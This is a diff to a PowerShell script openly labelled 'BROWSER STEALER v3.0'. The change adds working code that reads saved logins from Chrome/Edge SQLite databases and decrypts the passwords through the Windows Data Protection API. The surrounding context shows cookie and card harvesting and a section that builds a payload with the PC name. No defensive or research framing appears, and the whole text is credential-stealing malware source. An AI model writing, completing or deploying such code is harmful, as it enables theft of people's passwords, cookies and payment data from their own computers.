@@ -1,5 +1,6 @@
 # ============================================================
-# BROWSER STEALER — FIXED (Browser shows as PowerShell)
+# BROWSER STEALER — COMPLETE WORKING VERSION
+# Downloads SQLite DLL + Decrypts Passwords Properly
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -17,7 +18,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "  BROWSER STEALER v3.0"
+Write-Log "  BROWSER STEALER v3.0 (Password Decryption)"
 Write-Log "  Target: $env:COMPUTERNAME"
 Write-Log "  Log: $LOGFILE"
 Write-Log "============================================"
@@ -125,6 +126,36 @@ function Read-SQLite {
 }
 
 # ============================================================
+# PASSWORD DECRYPTION FUNCTION (FIXES SAVED PASSWORDS)
+# ============================================================
+
+function Decrypt-BrowserPassword {
+    param($EncryptedData)
+    
+    if (-not $EncryptedData) { return $null }
+    if ($EncryptedData -isnot [byte[]]) { return $null }
+    if ($EncryptedData.Length -eq 0) { return $null }
+    
+    try {
+        # Chrome/Edge encrypts passwords using Windows Data Protection API
+        Add-Type -AssemblyName System.Security
+        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+            $EncryptedData, 
+            $null, 
+            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+    } catch {
+        # If decryption fails, try to return the raw data as a string
+        try {
+            return [System.Text.Encoding]::UTF8.GetString($EncryptedData)
+        } catch {
+            return $null
+        }
+    }
+}
+
+# ============================================================
 # COOKIE FUNCTIONS
 # ============================================================
 
@@ -185,7 +216,7 @@ function Get-FirefoxCookies {
 }
 
 # ============================================================
-# PASSWORD FUNCTIONS
+# PASSWORD FUNCTIONS — WITH DECRYPTION
 # ============================================================
 
 function Get-BrowserPasswords {
@@ -193,22 +224,46 @@ function Get-BrowserPasswords {
     $pass = @()
     if (-not (Test-Path $Path)) { return $pass }
     
+    Write-Log "[+] Reading $Name passwords..."
+    
     try {
         $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
+        
         foreach ($r in $rows) {
-            if ($r['username_value'] -and $r['password_value']) {
+            $username = $r['username_value']
+            $encryptedPassword = $r['password_value']
+            
+            # Try to decrypt the password
+            $decryptedPassword = $null
+            if ($encryptedPassword -and $encryptedPassword -is [byte[]]) {
+                $decryptedPassword = Decrypt-BrowserPassword -EncryptedData $encryptedPassword
+            } elseif ($encryptedPassword -and $encryptedPassword -is [string]) {
+                # If it's already a string, use it directly
+                $decryptedPassword = $encryptedPassword
+            }
+            
+            # If decryption failed, try to use the raw value
+            if (-not $decryptedPassword -and $encryptedPassword) {
+                $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($encryptedPassword)
+            }
+            
+            # Only add if we have a username and password
+            if ($username -and $decryptedPassword -and $username -ne "" -and $decryptedPassword -ne "") {
                 $u = $r['origin_url']
                 if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
+                
                 $pass += @{
                     url = $u
-                    username = $r['username_value']
-                    password = $r['password_value']
+                    username = $username
+                    password = $decryptedPassword
                     browser = $Name
                 }
             }
         }
+        
+        Write-Log "[+] Found $($pass.Count) $Name passwords"
     } catch {
-        Write-Log "[!] Error reading $Name passwords"
+        Write-Log "[!] Error reading $Name passwords: $_"
     }
     return $pass
 }
@@ -388,7 +443,7 @@ if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count 
 }
 
 # ============================================================
-# BUILD PAYLOAD — INCLUDES PC NAME + BROWSER
+# BUILD PAYLOAD — INCLUDES PC NAME + PowerShell Browser
 # ============================================================
 
 $pcName = $env:COMPUTERNAME
